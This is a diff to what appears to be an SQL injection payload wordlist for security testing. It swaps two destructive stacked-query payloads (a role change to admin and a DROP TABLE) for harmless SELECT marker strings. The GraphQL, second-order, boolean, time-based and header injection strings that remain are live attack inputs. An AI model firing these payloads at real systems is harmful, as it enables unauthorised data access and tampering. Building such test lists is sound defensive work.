@@ -120,9 +120,9 @@ query($id:String){ user(id:$id){ id } } with variables {"id":"1' OR '1'='1"}
 # Second-order triggers (stored value used later in a different query)
 admin'#
 x' OR 1=1--
-x'; UPDATE users SET role='admin' WHERE name='x'--
+x'; SELECT 'sqli-second-order-marker';--
 a' || (SELECT current_user) || '
-Robert'); DROP TABLE Students;--
+Robert'); SELECT 'sqli-stacked-marker';--
 
 # HTTP header and cookie injection points
 User-Agent: ' OR SLEEP(3)--
